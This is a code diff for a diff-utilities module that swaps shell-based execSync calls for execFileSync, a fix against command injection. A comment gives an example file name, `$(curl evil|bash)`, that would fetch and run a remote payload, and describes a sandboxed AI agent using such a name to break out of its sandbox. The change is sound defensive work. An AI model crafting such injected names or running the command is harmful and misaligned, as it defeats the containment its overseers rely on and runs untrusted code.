@@ -1,7 +1,7 @@
 /**
  * Luak — Diff Utilities
  */
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import { join } from "node:path";
 import { existsSync, readFileSync, readdirSync } from "node:fs";
 
@@ -20,8 +20,11 @@ export function getGitDiff(workspacePath: string): { files_changed: FileDiff[]; 
   const files_deleted: string[] = [];
 
   try {
-    // Get list of changed files
-    const statusRaw = execSync("git diff --name-status HEAD", { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
+    // Get list of changed files. execFileSync (no shell) throughout so a model
+    // that creates a file named e.g. `$(curl evil|bash)` cannot get the name
+    // expanded by a shell — the sandbox would otherwise be defeated from
+    // inside by the very agent it exists to contain. (Audit C4.)
+    const statusRaw = execFileSync("git", ["diff", "--name-status", "HEAD"], { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
     if (!statusRaw) return { files_changed, files_created, files_deleted };
 
     for (const line of statusRaw.split("\n")) {
@@ -37,7 +40,7 @@ export function getGitDiff(workspacePath: string): { files_changed: FileDiff[]; 
 
       // Get patch for this file
       try {
-        const patch = execSync(`git diff HEAD -- "${filePath}"`, { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
+        const patch = execFileSync("git", ["diff", "HEAD", "--", filePath], { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
         const added = (patch.match(/^\+[^+]/gm) ?? []).length;
         const removed = (patch.match(/^-[^-]/gm) ?? []).length;
         files_changed.push({ path: filePath, lines_added: added, lines_removed: removed, patch });
